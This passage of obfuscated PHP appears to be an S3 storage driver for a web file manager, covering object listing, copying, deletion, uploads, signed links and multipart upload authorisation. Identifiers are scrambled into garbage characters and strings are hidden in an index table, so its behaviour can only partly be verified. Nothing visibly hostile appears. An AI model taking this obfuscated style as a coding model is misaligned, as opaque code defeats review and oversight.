$ùÒÏÙ™ë) { $Äµ›Ò¬— =& $_SERVER[óÔë„ú]; if (empty($ùÒÏÙ™ë)) { return array(); } $ĞÈ•Œ° = array_keys($ùÒÏÙ™ë); $ïæ‘İè = array(); $¢„ƒºí = trim($¢„ƒºí, $Äµ›Ò¬—[8]); foreach ($ùÒÏÙ™ë as $üÒ ğ¶ß => $¢œí‚­à) { $¨‰û”‚à = ltrim(substr(trim($üÒ ğ¶ß, $Äµ›Ò¬—[8]), strlen($¢„ƒºí)), $Äµ›Ò¬—[8]); if (substr($üÒ ğ¶ß, -1) == $Äµ›Ò¬—[8]) { $¨‰û”‚à = rtrim($¨‰û”‚à, $Äµ›Ò¬—[8]) . $Äµ›Ò¬—[8]; } $ïæ‘İè = array_merge($ïæ‘İè, $this->slicePath($¨‰û”‚à)); } $Ï¯Õ§ö‹ = array(); foreach (array_unique($ïæ‘İè) as $²ƒıú³) { $‰–ÇÑ˜ç = array($Äµ›Ò¬—[87] => $this->getPathOuter($Äµ›Ò¬—[8] . $¢„ƒºí . $Äµ›Ò¬—[8] . $²ƒıú³), $Äµ›Ò¬—[78] => 1, $Äµ›Ò¬—[79] => 0); if (substr($²ƒıú³, -1) != $Äµ›Ò¬—[8]) { $‰–ÇÑ˜ç[$Äµ›Ò¬—[78]] = 0; $ûêÀŒï¾ = $this->getPath($¢„ƒºí . $Äµ›Ò¬—[8] . $²ƒıú³); if (isset($ùÒÏÙ™ë[$ûêÀŒï¾])) { $À™Öšªœ = $ùÒÏÙ™ë[$ûêÀŒï¾]; if (isset($À™Öšªœ[$Äµ›Ò¬—[79]])) { $‰–ÇÑ˜ç[$Äµ›Ò¬—[79]] = intval($À™Öšªœ[$Äµ›Ò¬—[79]]); } if (isset($À™Öšªœ[$Äµ›Ò¬—[206]])) { $‰–ÇÑ˜ç[$Äµ›Ò¬—[88]] = intval($À™Öšªœ[$Äµ›Ò¬—[206]]); } } } $Ï¯Õ§ö‹[] = $‰–ÇÑ˜ç; } return $Ï¯Õ§ö‹; } public function slicePath($úËÈ¸ú­) { $‹¯çÜïÍ =& $_SERVER[óÔë„ú]; $ôŞè¢Õ = explode($‹¯çÜïÍ[8], trim($úËÈ¸ú­, $‹¯çÜïÍ[8])); $Ú²ŸÑâ† = 0; do { ++$Ú²ŸÑâ†; $‹˜Íì[] = implode($‹¯çÜïÍ[8], array_slice($ôŞè¢Õ, 0, $Ú²ŸÑâ†)) . $‹¯çÜïÍ[8]; } while ($Ú²ŸÑâ† < count($ôŞè¢Õ)); $‹˜Íì[count($ôŞè¢Õ) - 1] = $úËÈ¸ú­; return $‹˜Íì; } public function getHost() { $ÈÒ¼é€ =& $_SERVER[óÔë„ú]; $èşˆ¬‘ã = parse_url(trim($this->domain, $ÈÒ¼é€[8])); $ÚÓ×­Ê = isset($èşˆ¬‘ã[$ÈÒ¼é€[207]]) ? $èşˆ¬‘ã[$ÈÒ¼é€[207]] : http_type(); $ğ²Ô§–— = isset($èşˆ¬‘ã[$ÈÒ¼é€[208]]) ? $èşˆ¬‘ã[$ÈÒ¼é€[208]] : $èşˆ¬‘ã[$ÈÒ¼é€[87]]; if (isset($èşˆ¬‘ã[$ÈÒ¼é€[209]])) { $ğ²Ô§–— .= $ÈÒ¼é€[4] . $èşˆ¬‘ã[$ÈÒ¼é€[209]]; } return $ÚÓ×­Ê . $ÈÒ¼é€[210] . $ğ²Ô§–—; } public function pathEncode($›ìÎá“Í) { $›Úò ¼ =& $_SERVER[óÔë„ú]; return str_replace($›Úò ¼[211], $›Úò ¼[8], rawurlencode($›ìÎá“Í)); } public function writeLog($áÆûÌ‹é = '', $ÁÒ¢”¥ = false) { $û¦±© =& $_SERVER[óÔë„ú]; $—ƒôé³Ó = in_array(ACTION, array($û¦±©[212], $û¦±©[213])); if (!$—ƒôé³Ó && !GLOBAL_DEBUG) { return; } $ş££¼‹ = $áÆûÌ‹é; static $¥ÑËÑ¡ = null; if (!$¥ÑËÑ¡) { $¥ÑËÑ¡ = strtoupper($this->getType()); } $áÆûÌ‹é = $¥ÑËÑ¡ . $û¦±©[214] . $áÆûÌ‹é; if ($ÁÒ¢”¥) { $¹äÅô¤ğ = error_get_last(); if ($¹äÅô¤ğ) { $áÆûÌ‹é = array($áÆûÌ‹é, $¹äÅô¤ğ); } } write_log($áÆûÌ‹é, $û¦±©[215]); if ($—ƒôé³Ó) { throw new Exception($ş££¼‹); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($¸ä†«îË) { set_timeout(); require_once SDK_DIR . $_SERVER[óÔë„ú][216]; parent::__construct(); $this->_init($¸ä†«îË); } public function _init($²™ä˜¥) { $»“‰ø¼ =& $_SERVER[óÔë„ú]; $this->config = $²™ä˜¥; foreach ($²™ä˜¥ as $©Ô¿¸Â => $¨ÅÁ­¼î) { if (isset($this->{$©Ô¿¸Â})) { $this->{$©Ô¿¸Â} = $¨ÅÁ­¼î; } } $this->endpoint = $²™ä˜¥[$»“‰ø¼[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($»“‰ø¼[212], $»“‰ø¼[213]))) { $this->client->setExceptions(); } } public function setSignVersion($°¼„»‡ = "\166\x34") { $this->signVer = $°¼„»‡; $this->client->setSignatureVersion($°¼„»‡); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $¥±Ø«ë“) { return null; } } public function isBucketCors() { $‘±ª­Ÿ =& $_SERVER[óÔë„ú]; $„‰¶§–Œ = $this->getBucketCors(); if (!$„‰¶§–Œ || !is_array($„‰¶§–Œ)) { return !1; } if (!is_array($„‰¶§–Œ[$‘±ª­Ÿ[218]])) { $„‰¶§–Œ[$‘±ª­Ÿ[218]] = explode($‘±ª­Ÿ[50], $„‰¶§–Œ[$‘±ª­Ÿ[218]]); } if ($„‰¶§–Œ[$‘±ª­Ÿ[219]] != $‘±ª­Ÿ[220] || !in_array($‘±ª­Ÿ[220], $„‰¶§–Œ[$‘±ª­Ÿ[218]])) { return !1; } $ƒÂïßÏ = array_map($‘±ª­Ÿ[221], $„‰¶§–Œ[$‘±ª­Ÿ[222]]); if (!is_array($ƒÂïßÏ)) { $ƒÂïßÏ = array(); } $û•Úôõ™ = array($‘±ª­Ÿ[223], $‘±ª­Ÿ[224], $‘±ª­Ÿ[225], $‘±ª­Ÿ[226], $‘±ª­Ÿ[227]); $¾Ö±¢”Õ = array_diff($û•Úôõ™, $ƒÂïßÏ); return empty($¾Ö±¢”Õ); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Åì¿Ë—Ñ, $¢»ñÔÅ¤ = '', $üé¦á”¹ = REPEAT_RENAME) { $¬Ô²Ø¬‚ = $this->setContent($Åì¿Ë—Ñ, $¢»ñÔÅ¤); if ($¬Ô²Ø¬‚ !== !1) { return $this->getPathOuter($Åì¿Ë—Ñ); } return !1; } public function mkdir($ÈÑ¹€®Ä, $ç‡Àü£ª = REPEAT_SKIP) { $ÁãŞ¨è =& $_SERVER[óÔë„ú]; if (empty($ÈÑ¹€®Ä) && $ÈÑ¹€®Ä !== $ÁãŞ¨è[228]) { return !1; } if ($ç‡Àü£ª && $this->_isFolder($ÈÑ¹€®Ä)) { return $this->getPathOuter($ÈÑ¹€®Ä); } $äÕÈÕÈø = $this->setContent($ÈÑ¹€®Ä, $ÁãŞ¨è[12], !0); if ($äÕÈÕÈø !== !1) { return $this->getPathOuter($ÈÑ¹€®Ä); } return !1; } public function copyFile($Š‰¢ğ×ƒ, $Ñì°‡­è, $ÆÍÊİÆÒ = array()) { $ò­ÖÓòƒ =& $_SERVER[óÔë„ú]; $ßöƒïƒĞ = $this->objectMeta($Š‰¢ğ×ƒ); if (!$ßöƒïƒĞ) { return !1; } if ($ßöƒïƒĞ[$ò­ÖÓòƒ[79]] <= 1024 * 1024 * 200) { $•ÔŸÃ…İ = $this->client->copyObject($this->bucket, $Š‰¢ğ×ƒ, $this->bucket, $Ñì°‡­è, $ò­ÖÓòƒ[229], $ÆÍÊİÆÒ); } else { $•ÔŸÃ…İ = $this->client->multiCopyObject($this->bucket, $Š‰¢ğ×ƒ, $this->bucket, $Ñì°‡­è, $ÆÍÊİÆÒ); } $•ÔŸÃ…İ = $•ÔŸÃ…İ ? $this->getPathOuter($Ñì°‡­è) : !1; return $•ÔŸÃ…İ; } public function moveFile($¬åßö¦, $ŠÎì·Â) { if ($this->copyFile($¬åßö¦, $ŠÎì·Â)) { $this->delFile($¬åßö¦); return $this->getPathOuter($ŠÎì·Â); } return !1; } public function delFile($Ò¾ğÙÒ£) { return $this->client->deleteObject($this->bucket, $Ò¾ğÙÒ£); } public function delFolder($ìÛè×‹Â) { $ÇÔ¨¢Œš =& $_SERVER[óÔë„ú]; if (!$this->exist($ìÛè×‹Â)) { return !0; } $this->listItemCache = !1; $Ô±Çûçë = $this->fileList($ìÛè×‹Â); $this->listItemCache = !0; $ƒÑÙ²ßŠ = trim($ìÛè×‹Â, $ÇÔ¨¢Œš[8]) . $ÇÔ¨¢Œš[8]; if (!empty($ìÛè×‹Â) && $ìÛè×‹Â !== $ÇÔ¨¢Œš[228] && !in_array($ƒÑÙ²ßŠ, $Ô±Çûçë[$ÇÔ¨¢Œš[85]])) { $Ô±Çûçë[$ÇÔ¨¢Œš[85]][] = $ƒÑÙ²ßŠ; } $¸¸­­ı‚ = $this->delByBatch($Ô±Çûçë[$ÇÔ¨¢Œš[86]]); if (!$¸¸­­ı‚) { return !1; } $¸¸­­ı‚ = $this->delByBatch($Ô±Çûçë[$ÇÔ¨¢Œš[85]]); if (!$¸¸­­ı‚) { return !1; } return $this->delFile($ƒÑÙ²ßŠ); } private function delByBatch($ë„¤êñ) { foreach (array_chunk($ë„¤êñ, 1000) as $Æ´ÀœåÂ) { $™Øà¾ìš = $this->client->deleteObjects($this->bucket, $Æ´ÀœåÂ); if (!$™Øà¾ìš) { return !1; } } return !0; } public function rename($Ë²—ı¸Ì, $Ì·â‚) { return $this->renameObject($Ë²—ı¸Ì, $Ì·â‚); } public function listPath($˜‹˜«şô, $¡¼½•ï = false) { $ÉÒşıöë =& $_SERVER[óÔë„ú]; $Úú®Ï©Ã = $this->fileList($˜‹˜«şô, $ÉÒşıöë[8], !0); foreach ($Úú®Ï©Ã[$ÉÒşıöë[85]] as $ûæ—¯åÖ => $‹ƒØ) { $Úú®Ï©Ã[$ÉÒşıöë[85]][$ûæ—¯åÖ] = $this->folderInfo($‹ƒØ, $¡¼½•ï, $‹ƒØ); } foreach ($Úú®Ï©Ã[$ÉÒşıöë[86]] as $ûæ—¯åÖ => $‹ƒØ) { $Úú®Ï©Ã[$ÉÒşıöë[86]][$ûæ—¯åÖ] = $this->fileInfo($‹ƒØ[$ÉÒşıöë[32]], $¡¼½•ï, $‹ƒØ); } return $Úú®Ï©Ã; } protected function infoChildren($ûÕ«Âè¡, &$ãå—Ğ¸) { $ó¶ç¡È =& $_SERVER[óÔë„ú]; $ÙŞæüõ  = $this->fileList($ûÕ«Âè¡, $ó¶ç¡È[12], !0); $ãå—Ğ¸[$ó¶ç¡È[81]] += count($ÙŞæüõ [$ó¶ç¡È[85]]); $ãå—Ğ¸[$ó¶ç¡È[80]] += count($ÙŞæüõ [$ó¶ç¡È[86]]); foreach ($ÙŞæüõ [$ó¶ç¡È[86]] as $Êøœºë÷) { if (!$Êøœºë÷ || !$Êøœºë÷[$ó¶ç¡È[79]]) { continue; } $ãå—Ğ¸[$ó¶ç¡È[79]] += $Êøœºë÷[$ó¶ç¡È[79]]; } } private function fileInfo($·½ú›¤, $…ßìşô = false, $Š¸ğ½°ß = array()) { $µëºˆ‡¯ =& $_SERVER[óÔë„ú]; $ğ×èÅ°¦ = array($µëºˆ‡¯[32] => $this->pathThis($·½ú›¤), $µëºˆ‡¯[87] => $this->getPathOuter($·½ú›¤), $µëºˆ‡¯[33] => $µëºˆ‡¯[230], $µëºˆ‡¯[169] => $this->ext($·½ú›¤), $µëºˆ‡¯[79] => isset($Š¸ğ½°ß[$µëºˆ‡¯[79]]) ? $Š¸ğ½°ß[$µëºˆ‡¯[79]] : 0); if ($…ßìşô) { return $ğ×èÅ°¦; } $ğ×èÅ°¦[$µëºˆ‡¯[231]] = $ğ×èÅ°¦[$µëºˆ‡¯[88]] = 0; $ğ×èÅ°¦[$µëºˆ‡¯[232]] = $ğ×èÅ°¦[$µëºˆ‡¯[233]] = !0; if (empty($Š¸ğ½°ß)) { $Š¸ğ½°ß = $this->objectMeta($·½ú›¤); if (!$Š¸ğ½°ß) { return $ğ×èÅ°¦; } } if (isset($Š¸ğ½°ß[$µëºˆ‡¯[234]]) && $Š¸ğ½°ß[$µëºˆ‡¯[234]]) { $ğ×èÅ°¦[$µëºˆ‡¯[235]] = $Š¸ğ½°ß[$µëºˆ‡¯[234]]; } if (isset($Š¸ğ½°ß[$µëºˆ‡¯[206]])) { $ğ×èÅ°¦[$µëºˆ‡¯[88]] = $Š¸ğ½°ß[$µëºˆ‡¯[206]]; } if (isset($Š¸ğ½°ß[$µëºˆ‡¯[79]])) { $ğ×èÅ°¦[$µëºˆ‡¯[79]] = $Š¸ğ½°ß[$µëºˆ‡¯[79]]; } return $ğ×èÅ°¦; } private function folderInfo($ØÏÌ¤ Í, $ò”—æàæ = false, $âûÄ¥¼İ = array()) { $ñ€€®Æ =& $_SERVER[óÔë„ú]; $êÖÄí¥“ = array($ñ€€®Æ[32] => $this->pathThis($ØÏÌ¤ Í), $ñ€€®Æ[87] => $this->getPathOuter($ñ€€®Æ[8] . $ØÏÌ¤ Í), $ñ€€®Æ[33] => $ñ€€®Æ[78]); if ($ò”—æàæ) { return $êÖÄí¥“; } $êÖÄí¥“[$ñ€€®Æ[231]] = $êÖÄí¥“[$ñ€€®Æ[88]] = 0; $êÖÄí¥“[$ñ€€®Æ[232]] = $êÖÄí¥“[$ñ€€®Æ[233]] = !0; if ($ØÏÌ¤ Í == $ñ€€®Æ[12]) { return $êÖÄí¥“; } if (empty($âûÄ¥¼İ)) { $âûÄ¥¼İ = $this->objectMeta(trim($ØÏÌ¤ Í, $ñ€€®Æ[8]) . $ñ€€®Æ[8]); } if (isset($âûÄ¥¼İ[$ñ€€®Æ[206]])) { $êÖÄí¥“[$ñ€€®Æ[231]] = $âûÄ¥¼İ[$ñ€€®Æ[206]]; } return $êÖÄí¥“; } private function fileList($œöëù±À, $£§ñ‹Õ¥ = '', $ê¹ïÉÍÎ = 0) { $µ¦³Ó‘¹ =& $_SERVER[óÔë„ú]; $²êı = rtrim($œöëù±À, $µ¦³Ó‘¹[8]) . $µ¦³Ó‘¹[8]; $ã´øŒô = $this->listObjs($²êı, null, null, $£§ñ‹Õ¥); if (!$ã´øŒô) { return array($µ¦³Ó‘¹[85] => array(), $µ¦³Ó‘¹[86] => array()); } $²øŸŸ¡’ = $ˆÕ¡¤Ÿ¬ = array(); foreach ($ã´øŒô[$µ¦³Ó‘¹[236]] as $’«„Õ·) { $‹Şœú¸Æ = $’«„Õ·[$µ¦³Ó‘¹[32]]; if ($‹Şœú¸Æ == $²êı) { continue; } $Îß¾˜¨ = isset($’«„Õ·[$µ¦³Ó‘¹[79]]) ? $’«„Õ·[$µ¦³Ó‘¹[79]] : 0; $±ôääì = $Îß¾˜¨ == 0 && substr($‹Şœú¸Æ, strlen($‹Şœú¸Æ) - 1, 1) == $µ¦³Ó‘¹[8] ? !0 : !1; $this->cacheMethodInfoSet($‹Şœú¸Æ, $±ôääì, $’«„Õ·); if ($±ôääì) { $²øŸŸ¡’[] = $‹Şœú¸Æ; continue; } $ˆÕ¡¤Ÿ¬[] = $ê¹ïÉÍÎ ? $’«„Õ· : $‹Şœú¸Æ; } foreach ($ã´øŒô[$µ¦³Ó‘¹[237]] as $’«„Õ·) { $²øŸŸ¡’[] = $’«„Õ·[$µ¦³Ó‘¹[32]]; $this->cacheMethodInfoSet($’«„Õ·[$µ¦³Ó‘¹[32]], !0); } $this->cacheMethodInfoSet($œöëù±À, !0); return array($µ¦³Ó‘¹[85] => $²øŸŸ¡’, $µ¦³Ó‘¹[86] => $ˆÕ¡¤Ÿ¬); } private function listObjs($Å‡¿¶¨, $Ä¤óà€ = null, $÷ºñÊ˜ñ = null, $†«¸¹¿È = null) { $¼Ü³ãè¨ =& $_SERVER[óÔë„ú]; $Å‡¿¶¨ = trim($Å‡¿¶¨, $¼Ü³ãè¨[8]); $§æç†Ë• = empty($Å‡¿¶¨) && $Å‡¿¶¨ !== $¼Ü³ãè¨[228] ? $¼Ü³ãè¨[12] : $Å‡¿¶¨ . $¼Ü³ãè¨[8]; return $this->client->getBucket($this->bucket, $§æç†Ë•, $Ä¤óà€, $÷ºñÊ˜ñ, $†«¸¹¿È, !0); } public function has($ÎÎê£àŸ, $—òæì‹ = false, $í©”Çö¯ = true) { $Òğ°’›Ú =& $_SERVER[óÔë„ú]; $ÎÎê£àŸ = trim($ÎÎê£àŸ, $Òğ°’›Ú[8]); $·ß…µÙ– = empty($ÎÎê£àŸ) && $ÎÎê£àŸ !== $Òğ°’›Ú[228] ? $Òğ°’›Ú[12] : $ÎÎê£àŸ . $Òğ°’›Ú[8]; $öÂÕ¸å­ = null; $Ëİƒ§®¶ = 500; $‚Äè´ = $Òğ°’›Ú[8]; $µ·ˆÆúÃ = $‹ÆÄÇÉ¸ = array(); while (!0) { $¢—¶¶À = $this->listObjs($ÎÎê£àŸ, $öÂÕ¸å­, $Ëİƒ§®¶, $‚Äè´); if (!$¢—¶¶À) { break; } $öÂÕ¸å­ = $¢—¶¶À[$Òğ°’›Ú[238]]; $˜ñ¶ÂŠı = $¢—¶¶À[$Òğ°’›Ú[236]]; $¢“çó™÷ = $¢—¶¶À[$Òğ°’›Ú[237]]; if (empty($˜ñ¶ÂŠı) && empty($¢“çó™÷)) { break; } if (count($˜ñ¶ÂŠı) == 1 && $˜ñ¶ÂŠı[0][$Òğ°’›Ú[32]] == $·ß…µÙ–) { break; } if ($—òæì‹) { if (count($˜ñ¶ÂŠı)) { $˜ñ¶ÂŠı = array_column($˜ñ¶ÂŠı, $Òğ°’›Ú[32]); $µ·ˆÆúÃ = array_merge($µ·ˆÆúÃ, $˜ñ¶ÂŠı); } if (count($¢“çó™÷)) { $¢“çó™÷ = array_column($¢“çó™÷, $Òğ°’›Ú[32]); $‹ÆÄÇÉ¸ = array_merge($‹ÆÄÇÉ¸, $¢“çó™÷); } if ($öÂÕ¸å­ === null) { break; } continue; } if ($í©”Çö¯) { if (!empty($˜ñ¶ÂŠı)) { if (count($˜ñ¶ÂŠı) > 1 || isset($˜ñ¶ÂŠı[0][$Òğ°’›Ú[32]]) && $˜ñ¶ÂŠı[0][$Òğ°’›Ú[32]] != $·ß…µÙ–) { return !0; } } } else { if (!empty($¢“çó™÷)) { return !0; } } if ($öÂÕ¸å­ === null) { break; } } if ($—òæì‹) { $µ·ˆÆúÃ = array_diff($µ·ˆÆúÃ, array($·ß…µÙ–)); $µ·ˆÆúÃ = count(array_unique($µ·ˆÆúÃ)); $‹ÆÄÇÉ¸ = count(array_unique($‹ÆÄÇÉ¸)); return array($Òğ°’›Ú[239] => $µ·ˆÆúÃ, $Òğ°’›Ú[240] => $‹ÆÄÇÉ¸); } return !1; } public function listAll($¬€ğº–š) { $êØóÑ» =& $_SERVER[óÔë„ú]; $”£àš» = $this->fileList($¬€ğº–š, $êØóÑ»[12], !0); $¬ îöÖ× = array_to_keyvalue($”£àš»[$êØóÑ»[86]], $êØóÑ»[32]); foreach ($”£àš»[$êØóÑ»[85]] as $¦Î§àó™) { if (is_string($¦Î§àó™)) { $¬ îöÖ×[$¦Î§àó™] = array($êØóÑ»[79] => 0); } } return $this->listAllFiles($¬€ğº–š, $¬ îöÖ×); } public function canRead($­¶²—) { $—ĞÆã÷„ =& $_SERVER[óÔë„ú]; $•§É«ñ = $this->client->getAccessControlPolicy($this->bucket, $­¶²—); if (!$•§É«ñ) { return !1; } return in_array($•§É«ñ, array($—ĞÆã÷„[241], $—ĞÆã÷„[242], $—ĞÆã÷„[243])) ? !0 : !1; } public function canWrite($ä¾¢Â·¤) { $¬ò¨µşÉ =& $_SERVER[óÔë„ú]; $‚ÈıÊ£ú = $this->client->getAccessControlPolicy($this->bucket, $ä¾¢Â·¤); if (!$‚ÈıÊ£ú) { return !1; } return in_array($‚ÈıÊ£ú, array($¬ò¨µşÉ[241], $¬ò¨µşÉ[242])) ? !0 : !1; } public function getContent($üÓ˜ÌÛ) { return $this->client->getObject($this->bucket, $üÓ˜ÌÛ); } public function setContent($ÍÛ¡Ğ†î, $¾•´àêÕ = '', $ú„ÔäÁ¬ = false) { $‚µ²˜²¡ =& $_SERVER[óÔë„ú]; $ÍÛ¡Ğ†î = $ú„ÔäÁ¬ ? trim($ÍÛ¡Ğ†î, $‚µ²˜²¡[8]) . $‚µ²˜²¡[8] : $ÍÛ¡Ğ†î; $ä«©´œÊ = get_file_mime(get_path_ext($ÍÛ¡Ğ†î)); $ü×“üÛ» = $this->client->putObject($¾•´àêÕ, $this->bucket, $ÍÛ¡Ğ†î, $‚µ²˜²¡[229], array(), $ä«©´œÊ); if (!$ü×“üÛ») { return !1; } if ($ú„ÔäÁ¬) { return !0; } return $ü×“üÛ» ? !0 : !1; } public function fileSubstr($²ı‡áãÒ, $·Ëıçà¼, $Ôê°’ÃÁ) { $÷´ÈôÎ­ = $·Ëıçà¼ + $Ôê°’ÃÁ - 1; return $this->client->getObject($this->bucket, $²ı‡áãÒ, array($_SERVER[óÔë„ú][244] => "\x62\171\x74\145\163\x3d{$·Ëıçà¼}\55{$÷´ÈôÎ­}")); } public function upload($¼¸íöğ÷, $û‰ƒå­Í, $µøÜŞàÉ = false, $İ¾Ş¿ÎÇ = REPEAT_REPLACE) { $ú¡ŸÉÄ˜ =& $_SERVER[óÔë„ú]; $°ÉÜ«Ë½ = array($ú¡ŸÉÄ˜[245] => @md5_file($û‰ƒå­Í)); $Ü¼å‚æ€ = array($ú¡ŸÉÄ˜[246] => get_file_mime(get_path_ext($¼¸íöğ÷))); if (IO::size($û‰ƒå­Í) <= 1024 * 1024 * 200) { $©â°Œœ = $this->client->putObjectFile($û‰ƒå­Í, $this->bucket, $¼¸íöğ÷, $ú¡ŸÉÄ˜[229], $°ÉÜ«Ë½, $Ü¼å‚æ€); return !empty($©â°Œœ) ? $this->getPathOuter($¼¸íöğ÷) : !1; } $ôƒ½ï‹¡ = $this->client->multiUploadObject($û‰ƒå­Í, $this->bucket, trim($¼¸íöğ÷, $ú¡ŸÉÄ˜[8]), $°ÉÜ«Ë½, $Ü¼å‚æ€); return $ôƒ½ï‹¡ ? $this->getPathOuter($¼¸íöğ÷) : !1; } public function download($ÁŒÕâÙ, $­†Š†Îİ) { if (!@is_dir($this->pathFather($­†Š†Îİ)) && !IO::mkdir($this->pathFather($­†Š†Îİ))) { return !1; } $¼ßÙ¤† = $this->client->getObject($this->bucket, $ÁŒÕâÙ, array(), $­†Š†Îİ); return $¼ßÙ¤† !== !1 ? $­†Š†Îİ : !1; } public function link($ş§üåØÀ, $‘¹‡ù²÷ = array()) { $Ãç©„‘¿ =& $_SERVER[óÔë„ú]; if ($this->signVer == $Ãç©„‘¿[247]) { return $this->client->getAuthenticatedURL($this->bucket, $ş§üåØÀ, 3600 * 12, $‘¹‡ù²÷); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ş§üåØÀ, $Ãç©„‘¿[8]), 3600 * 12, $this->region, array(), !0, $‘¹‡ù²÷); } public function fileOut($Ñ¿ŞŠş“, $ûŒ”ƒ¤ï = false, $†õ«—«Œ = false, $ª¡Æ½¦ = '') { $˜ë­º‡ =& $_SERVER[óÔë„ú]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ñ¿ŞŠş“, $ûŒ”ƒ¤ï, $†õ«—«Œ, $ª¡Æ½¦); } if (!$†õ«—«Œ) { $†õ«—«Œ = $this->pathThis($Ñ¿ŞŠş“); } $¾üÑ“µ = get_file_mime(get_path_ext($†õ«—«Œ)); if ($¾üÑ“µ == $˜ë­º‡[248]) { return parent::fileOut($Ñ¿ŞŠş“, $ûŒ”ƒ¤ï, $†õ«—«Œ, $ª¡Æ½¦); } $÷ŞÎ›Ùü = array($˜ë­º‡[249] => $¾üÑ“µ); if ($ûŒ”ƒ¤ï) { $÷ŞÎ›Ùü[$˜ë­º‡[250]] = $˜ë­º‡[251] . rawurlencode($†õ«—«Œ); } else { } $øöÛé¹× = $this->link($Ñ¿ŞŠş“, $÷ŞÎ›Ùü); $this->fileOutLink($øöÛé¹×); } public function fileOutServer($å¶ŠÒÌ¹, $æƒÚ‹µÙ = false, $¥˜ê—§« = false, $ÑÎäçù = '') { parent::fileOut($å¶ŠÒÌ¹, $æƒÚ‹µÙ, $¥˜ê—§«, $ÑÎäçù); } public function fileOutImageServer($èûšÊ¯Ü, $ßı¶µé³ = 250) { parent::fileOutImage($èûšÊ¯Ü, $ßı¶µé³); } public function hashMd5($ÇÈòæ†§, $™êß„ªÕ = '') { $ä¡ÜŸ–ş = $this->objectMeta($ÇÈòæ†§); if (!$ä¡ÜŸ–ş) { return !1; } $™êß„ªÕ = $™êß„ªÕ ? $™êß„ªÕ : _get($ä¡ÜŸ–ş, $_SERVER[óÔë„ú][252]); return $™êß„ªÕ; } public function uploadFormData($ûÓ øÖì, $Õ¡ïôîŸ = 3600) { $±ùµ”Èç =& $_SERVER[óÔë„ú]; $á‹Ã³¬Ü = $this->pathFather($ûÓ øÖì); $À½îãˆ = $this->client->getHttpUploadPostParams($this->bucket, $á‹Ã³¬Ü, $±ùµ”Èç[229], $Õ¡ïôîŸ); return array_merge((array) $À½îãˆ, array($±ùµ”Èç[208] => $this->getHost())); } public function multiUploadFormData($ú‡ì¥à, $£ ×Ù¹¤ = 3600) { $¹¢¼Æ’ =& $_SERVER[óÔë„ú]; $¾ÛçëÍ = gmdate($¹¢¼Æ’[253]); $ÈÜ–—¥ = array(); $çÅôô¾ = $this->client->getUploadId($this->bucket, $ú‡ì¥à, $ÈÜ–—¥); if (!$çÅôô¾) { return !1; } return array($¹¢¼Æ’[254] => $çÅôô¾, $¹¢¼Æ’[208] => $this->getHost() . $¹¢¼Æ’[8] . $this->pathEncode($ú‡ì¥à), $¹¢¼Æ’[255] => $¾ÛçëÍ, $¹¢¼Æ’[97] => $ú‡ì¥à); } public function multiUploadAuthData($–ŠüÑïø, $é—ºÎÉ¡ = array()) { $öÂÛ“Âô =& $_SERVER[óÔë„ú]; $ùğûŒëÚ = isset($é—ºÎÉ¡[$öÂÛ“Âô[255]]) ? $é—ºÎÉ¡[$öÂÛ“Âô[255]] : gmdate($öÂÛ“Âô[253]); $½´•ÏÔ = isset($é—ºÎÉ¡[$öÂÛ“Âô[169]]) ? $é—ºÎÉ¡[$öÂÛ“Âô[169]] : $öÂÛ“Âô[12]; $ÕµèĞÕ„ = $é—ºÎÉ¡[$öÂÛ“Âô[97]]; unset($é—ºÎÉ¡[$öÂÛ“Âô[97]]); if (isset($é—ºÎÉ¡[$öÂÛ“Âô[256]])) { $é—ºÎÉ¡[$öÂÛ“Âô[255]] = $ùğûŒëÚ; return $this->listUploadParts($ÕµèĞÕ„, $é—ºÎÉ¡); } $¿»†Ç´ = array($öÂÛ“Âô[257], $öÂÛ“Âô[12], $öÂÛ“Âô[123], $öÂÛ“Âô[12], "\170\x2d\x61\x6d\172\x2d\x64\x61\164\x65\x3a{$ùğûŒëÚ}", $öÂÛ“Âô[8] . $this->bucket . $öÂÛ“Âô[8] . $this->pathEncode($ÕµèĞÕ„) . $½´•ÏÔ); if (strpos($½´•ÏÔ, $öÂÛ“Âô[258]) === 0) { $¿»†Ç´[0] = $öÂÛ“Âô[259]; } if (isset($é—ºÎÉ¡[$öÂÛ“Âô[260]]) && $é—ºÎÉ¡[$öÂÛ“Âô[260]] == $öÂÛ“Âô[261]) { $¿»†Ç´[0] = $öÂÛ“Âô[261]; } $®ëµŠå = implode($öÂÛ“Âô[262], $¿»†Ç´); $ÃÔéå—ã = base64_encode(hash_hmac($öÂÛ“Âô[263], $®ëµŠå, $this->secret, !0)); $ŒÈ—°Í = $öÂÛ“Âô[264] . $this->accessKey . $öÂÛ“Âô[4] . $ÃÔéå—ã; if (strpos($½´•ÏÔ, $öÂÛ“Âô[258]) === 0) { return array($öÂÛ“Âô[265] => $ŒÈ—°Í, $öÂÛ“Âô[255] => $ùğûŒëÚ); } return $ŒÈ—°Í; } public function listUploadParts($ç¼ßŒ ¬, $ºˆâÉ»€ = array()) { $í¬Óß =& $_SERVER[óÔë„ú]; $¼—­†ş² = str_replace($í¬Óß[266], $í¬Óß[12], $ºˆâÉ»€[$í¬Óß[169]]); $òÓ çûí = $this->client->listParts($this->bucket, $ç¼ßŒ ¬, $¼—­†ş²); if (!$òÓ çûí) { return !1; } unset($ºˆâÉ»€[$í¬Óß[256]], $ºˆâÉ»€[$í¬Óß[260]]); $ºˆâÉ»€[$í¬Óß[97]] = $ç¼ßŒ ¬; $ÃÍèƒìÕ = $this->multiUploadAuthData($ç¼ßŒ ¬, $ºˆâÉ»€); if (empty($ÃÍèƒìÕ)) { return !1; } return array($í¬Óß[265] => $ÃÍèƒìÕ, $í¬Óß[255] => $ºˆâÉ»€[$í¬Óß[255]], $í¬Óß[267] => $òÓ çûí); } public function getHost() { $ûõ‚¸¨¤ =& 